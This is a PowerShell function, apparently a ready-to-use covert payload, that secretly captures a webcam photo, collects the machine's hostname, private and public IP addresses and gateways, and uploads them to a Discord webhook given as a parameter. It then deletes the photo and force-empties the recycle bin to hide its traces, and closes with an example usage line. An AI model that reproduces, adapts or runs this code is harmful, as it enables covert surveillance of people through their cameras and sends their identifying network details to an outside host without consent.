function Get-Pic {
    param(
        [Parameter(Mandatory=$true)]
        [string]$wh
    )

    $outputImage = Join-Path ([System.IO.Path]::GetTempPath()) "snapshot.png"
    & ffmpeg -f dshow -i video="Integrated Camera" -vframes 1 $outputImage

    $hostname = $env:COMPUTERNAME

    $wifiAdapter = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" }
    $wifiIPAddress = ($wifiAdapter | Get-NetIPAddress -AddressFamily IPv4).IPAddress
    $wifiPublicIPAddress = Invoke-RestMethod -Uri 'http://ipinfo.io/ip'
    $wifiGateway = ($wifiAdapter | Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop

    $ethernetAdapter = Get-NetAdapter | Where-Object { $_.Name -like "*Ethernet*" }
    $ethernetIPAddress = ($ethernetAdapter | Get-NetIPAddress -AddressFamily IPv4).IPAddress
    $ethernetGateway = ($ethernetAdapter | Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop

    $infoMessage = "Hostname: $hostname, WiFi Private IP: $wifiIPAddress, WiFi Public IP: $wifiPublicIPAddress, WiFi Default Gateway: $wifiGateway, Ethernet IP: $ethernetIPAddress, Ethernet Default Gateway: $ethernetGateway"

    $boundary = [System.Guid]::NewGuid().ToString()
    $contentType = "multipart/form-data; boundary=$boundary"

    $body = "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"payload_json`"`r`n`r`n" +
            "{ `"content`": `"$infoMessage`" }`r`n" +
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"file`"; filename=`"$outputImage`"`r`n" +
            "Content-Type: application/octet-stream`r`n`r`n"

    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)
    $imageBytes = [System.IO.File]::ReadAllBytes($outputImage)
    $endBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--")

    $bytes = [byte[]]::new($bodyBytes.Length + $imageBytes.Length + $endBytes.Length)
    [System.Array]::Copy($bodyBytes, 0, $bytes, 0, $bodyBytes.Length)
    [System.Array]::Copy($imageBytes, 0, $bytes, $bodyBytes.Length, $imageBytes.Length)
    [System.Array]::Copy($endBytes, 0, $bytes, $bodyBytes.Length + $imageBytes.Length, $endBytes.Length)

    Invoke-RestMethod -Uri $wh -Method Post -ContentType $contentType -Body $bytes

    Remove-Item -Path $outputImage -Force

    Clear-RecycleBin -Force
}

# Example Usage
# Get-Pic -wh "YOUR DISCORD WEBHOOK"